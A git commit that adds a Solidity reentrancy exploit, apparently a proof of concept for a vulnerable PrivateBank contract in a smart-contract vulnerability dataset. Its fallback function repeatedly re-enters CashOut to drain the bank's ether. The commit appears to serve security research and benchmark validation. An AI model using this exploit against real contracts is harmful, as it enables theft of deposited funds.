1941599b13f8616a1829684111ce227ab01dffe3
sofiabobadilla <sofy.bobadilla@gmail.com>
2024-07-24 15:54:36 +0200

    add: attack for 0xb9

---
+++ smartbugs-curated/0.4.x/contracts/reentrancy/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e_attack.sol
@@ -0,0 +1,30 @@
+pragma solidity ^0.4.19;
+
+import "../dataset/reentrancy/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol";
+
+
+contract MaliciousContract{
+    PrivateBank privateBank;
+    
+
+    constructor(address _privateBank) public{
+        privateBank= PrivateBank (_privateBank);
+    }
+
+   function attack(uint amount) public {
+        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
+        privateBank.CashOut(amount);
+    }
+
+    function deposit()  public payable{
+        require(msg.value >= 1 ether, "Must add at least 1 ether");
+        privateBank.Deposit.value(msg.value)();        
+    }
+
+    function() payable public {
+        // Re-enter the vulnerable function if there's still balance to collect
+        if ( address(privateBank).balance >= 1 ether) {
+            privateBank.CashOut(1 ether);
+        }
+    }
+}
